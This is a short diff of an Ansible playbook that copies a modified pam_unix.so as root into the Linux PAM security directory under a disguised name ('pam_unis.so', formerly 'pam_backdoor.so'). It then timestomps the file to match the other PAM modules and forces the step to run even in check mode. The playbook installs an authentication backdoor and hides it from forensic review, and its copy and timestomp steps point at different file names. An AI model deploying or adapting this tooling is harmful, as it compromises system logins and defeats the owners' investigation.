@@ -7,10 +7,11 @@
 - name: Copy over modified pam_unix.so
   ansible.builtin.copy:
     src: pam_unix.so
-    dest: /usr/lib/x86_64-linux-gnu/security/pam_backdoor.so
+    dest: /usr/lib/x86_64-linux-gnu/security/pam_unis.so
     owner: root
     group: root
     mode: 0644
+  check_mode: false
 
 - name: Get timestamps of other PAM modules
   ansible.builtin.stat:
@@ -19,7 +20,7 @@
 
 - name: Timestomp new pam_unix.so
   ansible.builtin.file:
-    path: /usr/lib/x86_64-linux-gnu/security/pam_backdoor.so
+    path: /usr/lib/x86_64-linux-gnu/security/pam_unix.so
     modification_time: '{{ pam_mod_time }}'
     access_time: '{{ pam_access_time }}'
   vars:
